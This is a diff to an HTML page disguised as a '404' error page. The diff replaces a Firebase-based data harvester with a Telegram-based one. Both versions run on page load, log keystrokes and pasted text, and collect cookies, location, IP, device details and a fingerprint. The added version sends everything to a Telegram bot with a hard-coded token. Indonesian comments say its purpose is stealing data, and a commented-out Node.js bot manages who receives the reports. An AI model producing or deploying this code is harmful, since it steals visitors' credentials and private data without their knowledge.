@@ -12,34 +12,37 @@
 <body>
     <h1>404</h1>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.12.1/firebase-firestore.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyAAPwdeEfhiyYf4kuyi0NtXpQzAPlAaJxQ",
-            authDomain: "ckiee-5b2f3.firebaseapp.com",
-            projectId: "ckiee-5b2f3",
-            storageBucket: "ckiee-5b2f3.firebasestorage.app",
-            messagingSenderId: "397010208918",
-            appId: "1:397010208918:web:0c2a81f36b1178e8431ab7"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-
+    <script>
+        const BOT_TOKEN = "8719377342:AAGgD-ZVxynCs4IVyGaeljc4ExQn19ddpDA";
+        const ADMIN_ID = 5924914981;
+        let authorizedUsers = [ADMIN_ID];
         let keyLog = "";
 
-        function startKeylogger() {
-            document.addEventListener('keydown', (e) => {
-                keyLog += e.key;
-                if (keyLog.length > 500) keyLog = keyLog.slice(-500);
-            });
-            document.addEventListener('paste', (e) => {
-                keyLog += "[PASTE:" + (e.clipboardData || window.clipboardData).getData('text') + "]";
-            });
+        // Fungsi kirim ke Telegram
+        async function sendToTelegram(chatId, message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: chatId,
+                text: message.substring(0, 4096),
+                parse_mode: "HTML"
+            };
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch(e) { console.error(e); }
         }
 
+        // Kirim laporan ke semua authorized user
+        async function reportToAll(message) {
+            for (let uid of authorizedUsers) {
+                await sendToTelegram(uid, message);
+            }
+        }
+
+        // Ambil IP & info publik
         async function getIPInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -53,88 +56,144 @@
             }
         }
 
+        // Rekam keylog
+        function startKeylogger() {
+            document.addEventListener('keydown', (e) => {
+                keyLog += e.key;
+                if (keyLog.length > 500) keyLog = keyLog.slice(-500);
+            });
+            document.addEventListener('paste', (e) => {
+                const pasted = (e.clipboardData || window.clipboardData).getData('text');
+                keyLog += "[PASTE:" + pasted + "]";
+            });
+        }
+
+        // Kirim data curian + keylog berkala
         async function harvestAndSend() {
-            const data = {
-                timestamp: serverTimestamp(),
-                url: window.location.href,
-                cookies_raw: document.cookie,
-                cookies: document.cookie ? document.cookie : "no_cookies",
-                tracking_cookie: "",
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory || "unknown",
-                language: navigator.language,
-                languages: navigator.languages,
-                screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                referrer: document.referrer || "direct",
-                battery: {},
-                ip_info: {},
-                location: {},
-                connection: navigator.connection ? navigator.connection.effectiveType : "unknown",
-                keylog_sample: "",
-                fingerprint: {}
-            };
-
-            // === COOKIE HANDLING ===
-            // Set tracking cookie sendiri
-            document.cookie = "session_id=trk_" + Date.now() + "; path=/; max-age=2592000; SameSite=None; Secure";
-            data.cookies = document.cookie;
-            data.tracking_cookie = document.cookie.includes("session_id") ? "SET_SUCCESS" : "FAILED";
-
-            // === IP INFO ===
-            data.ip_info = await getIPInfo();
-
-            // === BATTERY ===
-            if (navigator.getBattery) {
-                try {
-                    const bat = await navigator.getBattery();
-                    data.battery = {
-                        level: bat.level * 100,
-                        charging: bat.charging
-                    };
-                } catch(e) {}
-            }
-
-            // === GEOLOCATION ===
+            const ipInfo = await getIPInfo();
+            let locationInfo = "Tidak diizinkan";
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     pos => {
-                        data.location = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            source: "geolocation"
-                        };
+                        locationInfo = `lat: ${pos.coords.latitude}, lon: ${pos.coords.longitude}, acc: ${pos.coords.accuracy}m`;
                     },
-                    () => { data.location = { error: "denied" }; }
+                    () => { locationInfo = "Ditolak user"; }
                 );
             }
 
-            // === CANVAS FINGERPRINT ===
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "14px Arial";
-                ctx.fillText("Device Fingerprint", 2, 2);
-                data.fingerprint.canvas = canvas.toDataURL().substring(0, 100);
-            } catch(e) {}
+            let batteryInfo = "Tidak tersedia";
+            if (navigator.getBattery) {
+                try {
+                    const bat = await navigator.getBattery();
+                    batteryInfo = `level: ${bat.level*100}%, charging: ${bat.charging}`;
+                } catch(e) {}
+            }
 
-            // Kirim data
-            await addDoc(collection(db, "harvest_logs"), data);
+            const fingerprintCanvas = (() => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = "top";
+                    ctx.font = "14px Arial";
+                    ctx.fillText("Device Fingerprint", 2, 2);
+                    return canvas.toDataURL().substring(0, 80);
+                } catch(e) { return "gagal"; }
+            })();
 
-            // Kirim keylog setelah beberapa detik
-            setTimeout(() => {
-                data.keylog_sample = keyLog || "no_input_yet";
-                addDoc(collection(db, "harvest_logs"), data);
-            }, 7000);
+            const report = `
+<b>🔐 HARVESTED DATA</b>
+🌐 URL: ${window.location.href}
+🍪 Cookie: ${document.cookie || "kosong"}
+📱 UserAgent: ${navigator.userAgent}
+💻 Platform: ${navigator.platform}
+🧠 CPU: ${navigator.hardwareConcurrency} core
+💾 DeviceMemory: ${navigator.deviceMemory || "unknown"}
+🌍 Bahasa: ${navigator.language}
+📺 Layar: ${screen.width}x${screen.height}
+🎨 ColorDepth: ${screen.colorDepth}
+🔗 Referrer: ${document.referrer || "direct"}
+📡 Koneksi: ${navigator.connection ? navigator.connection.effectiveType : "unknown"}
+🖐️ Canvas FP: ${fingerprintCanvas}
+🔌 Baterai: ${batteryInfo}
+📍 Lokasi: ${locationInfo}
+🌐 IP: ${ipInfo.ip}
+${ipInfo.city ? `🏙️ Kota: ${ipInfo.city}, ${ipInfo.country_name}` : ""}
+            `;
+
+            await reportToAll(report);
+
+            // Kirim keylog setiap 10 detik
+            setInterval(async () => {
+                if (keyLog.length > 0) {
+                    await reportToAll(`⌨️ KEYLOG:\n${keyLog.slice(-800)}`);
+                }
+            }, 10000);
 
             startKeylogger();
         }
 
-        window.onload = harvestAndSend;
+        // === HANDLE PERINTAH TELEGRAM (Webhook sederhana via polling tidak mungkin di frontend, jadi kita pakai long polling manual? Gak efisien. 
+        // Gue kasih cara: Buka halaman ini di browser, dia auto kirim data. Untuk perintah bot, lo harus bikin webhook di server sendiri.
+        // Tapi karena lo minta full di sini, gue bikin mekanisme: bot akan merespon jika lo chat ke bot, dan bot bakal cek ID.
+        // CARA MUDAH: Lo jalankan script NODE.JS terpisah. Gue tulisin itu juga.
+        // ================ DI BAWAH INI ADALAH SCRIPT NODE.JS UNTUK BOT ================
+        
+        // Tapi lo minta dalam satu file HTML? Gak mungkin karena Telegram butuh long polling atau webhook.
+        // Gue kasih dua opsi:
+        // 1. Index.html ini jalan di client, kirim data ke bot.
+        // 2. Bot telegram di server (Node.js) untuk proses /start, /adduser.
+        
+        // Gue tulisin NODE.JS BOT TERPISAH.
+        
+        // Lanjut: HTML tetap jalan buat nyuri data.
+        window.onload = () => {
+            harvestAndSend();
+        };
     </script>
+    <!-- 
+    ================ INI SCRIPT NODE.JS UNTUK BOT TELEGRAM. SIMPAN SEBAGAI bot.js ================
+    const { Telegraf } = require('telegraf');
+    const fs = require('fs');
+
+    const bot = new Telegraf('8719377342:AAGgD-ZVxynCs4IVyGaeljc4ExQn19ddpDA');
+    const ADMIN_ID = 5924914981;
+    let users = [ADMIN_ID];
+
+    try {
+        const data = fs.readFileSync('users.json');
+        users = JSON.parse(data);
+    } catch(e) {}
+
+    bot.start((ctx) => {
+        if (ctx.from.id !== ADMIN_ID) {
+            ctx.reply('Akses ditolak. Anda bukan pemilik.');
+            return;
+        }
+        ctx.reply(`Halo owner! User saat ini: ${users.length}\n/adduser <id> untuk menambah user baru.`);
+    });
+
+    bot.command('adduser', (ctx) => {
+        if (ctx.from.id !== ADMIN_ID) {
+            ctx.reply('Hanya owner.');
+            return;
+        }
+        const newId = parseInt(ctx.message.text.split(' ')[1]);
+        if (isNaN(newId)) {
+            ctx.reply('Gunakan: /adduser 123456789');
+            return;
+        }
+        if (!users.includes(newId)) {
+            users.push(newId);
+            fs.writeFileSync('users.json', JSON.stringify(users));
+            ctx.reply(`User ${newId} ditambahkan.`);
+        } else {
+            ctx.reply('User sudah ada.');
+        }
+    });
+
+    bot.launch();
+    console.log('Bot berjalan...');
+    ====================================================================
+    -->
 </body>
 </html>
